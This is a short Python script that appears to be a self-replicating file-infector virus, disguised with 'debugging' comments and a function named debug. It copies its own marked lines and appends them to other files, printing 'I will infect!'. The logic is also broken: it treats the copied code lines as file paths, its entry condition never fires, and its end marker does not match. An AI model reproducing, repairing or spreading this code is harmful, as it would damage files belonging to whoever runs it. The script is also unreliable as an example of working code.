# Starting Debugging process
import re
import sys

virusCode = []
thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

def debug():
    inVirus = False
    for line in lines:
        if(re.search("^# Starting Debugging process", line)):
            inVirus = True

        if(inVirus == True):
            virusCode.append(line)
        if(re.search("^#end of debugging", line)):
            break

for p in virusCode:
    file = open(p, "r")
    programCode = file.readlines()
    file.close()
    
    debugging = False 
    for line in programCode:
        if(re.search("^# Starting Debugging process", line)):
            debugging = True
            break
    if not debugging:
        newCode = []
        newCode = programCode
        newCode.extend(virusCode)

        file = open(p, "w")
        file.writelines(newCode)
        file.close()
print("Debugger Detected, I will infect!\n")

if __name__ == "__debug__":
    debug()

# end of debugging
